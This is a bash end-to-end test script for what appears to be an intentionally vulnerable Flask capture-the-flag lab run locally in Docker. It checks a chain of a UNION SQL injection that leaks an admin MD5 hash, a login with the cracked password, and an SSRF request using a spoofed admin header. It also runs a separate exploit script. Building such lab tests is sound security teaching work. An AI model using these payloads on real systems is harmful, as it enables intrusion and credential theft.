#!/usr/bin/env bash
# sequence: SQLi -> hash crack -> SSRF end-to-end test
set -e

DC=$(docker compose version &>/dev/null && echo "docker compose" || echo "docker-compose")
PORT=8114
BASE="http://127.0.0.1:$PORT"
FAIL=0

cleanup() {
  $DC down --remove-orphans 2>/dev/null || true
}
trap cleanup EXIT

echo "[*] Building container..."
$DC up --build -d

echo "[*] Waiting for Flask on port $PORT..."
for i in $(seq 1 30); do
  curl -sf "$BASE/" >/dev/null 2>&1 && break
  sleep 2
  if [ "$i" -eq 30 ]; then echo "[FAIL] Service timed out"; $DC logs; exit 1; fi
done
echo "[*] Service ready"

# --- Test 1: home page ---
echo ""
echo "[*] Test 1: home page"
OUT=$(curl -sf "$BASE/")
if echo "$OUT" | grep -qi "DataSearch"; then
  echo "[PASS] Home page contains DataSearch"
else
  echo "[FAIL] Home page missing DataSearch"; FAIL=1
fi

# --- Test 2: SQLi leaks admin hash ---
echo ""
echo "[*] Test 2: UNION SQLi leaks admin password hash"
# Use python3 to do the whole request to avoid shell quoting issues with single quotes
HASH=$(python3 - << 'PYEOF'
import urllib.request, urllib.parse, json
BASE = "http://127.0.0.1:8114"
payload = "' UNION SELECT 1, password_hash, role FROM users WHERE role='admin' --"
url = BASE + '/search?q=' + urllib.parse.quote(payload)
with urllib.request.urlopen(url, timeout=10) as r:
    data = json.loads(r.read())
    for row in data.get('results', []):
        if row.get('role') == 'admin':
            print(row['username'])
            break
PYEOF
)
EXPECTED=$(python3 -c "import hashlib; print(hashlib.md5(b'password123').hexdigest())")
if [ "$HASH" = "$EXPECTED" ]; then
  echo "[PASS] SQLi leaked admin hash: $HASH"
else
  echo "[FAIL] Hash mismatch. Got: '$HASH' Expected: '$EXPECTED'"; FAIL=1
fi

# --- Test 3: login with cracked password returns flag1 ---
echo ""
echo "[*] Test 3: login with cracked password returns flag1"
OUT=$(curl -sf -X POST -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":"password123"}' "$BASE/login")
if echo "$OUT" | grep -qE '"POC\{[0-9a-f]+\}"'; then
  echo "[PASS] Login returned flag1"
else
  echo "[FAIL] Login did not return flag1: $OUT"; FAIL=1
fi

# --- Test 4: SSRF via /import ---
echo ""
echo "[*] Test 4: SSRF via /import returns flag2"
OUT=$(curl -sf -X POST -H 'Content-Type: application/json' -H 'X-Role: admin' \
  -d '{"url":"http://internal.local/secret"}' "$BASE/import")
if echo "$OUT" | grep -qE '"POC\{[0-9a-f]+\}"'; then
  echo "[PASS] SSRF returned flag2"
else
  echo "[FAIL] SSRF did not return flag2: $OUT"; FAIL=1
fi

# --- Test 5: automated exploit ---
echo ""
echo "[*] Test 5: automated exploit"
EXPLOIT_OUT=$(python3 exploit/exploit.py "$BASE" 2>&1)
echo "$EXPLOIT_OUT"
FLAG_COUNT=$(echo "$EXPLOIT_OUT" | grep -cE 'POC\{[0-9a-f]+\}' || true)
if [ "$FLAG_COUNT" -ge 2 ]; then
  echo "[PASS] Exploit returned both flags"
else
  echo "[FAIL] Exploit did not return 2 POC flags"; FAIL=1
fi

echo ""
if [ "$FAIL" -eq 0 ]; then
  echo "[PASS] All tests passed"; exit 0
else
  echo "[FAIL] One or more tests failed"; exit 1
fi
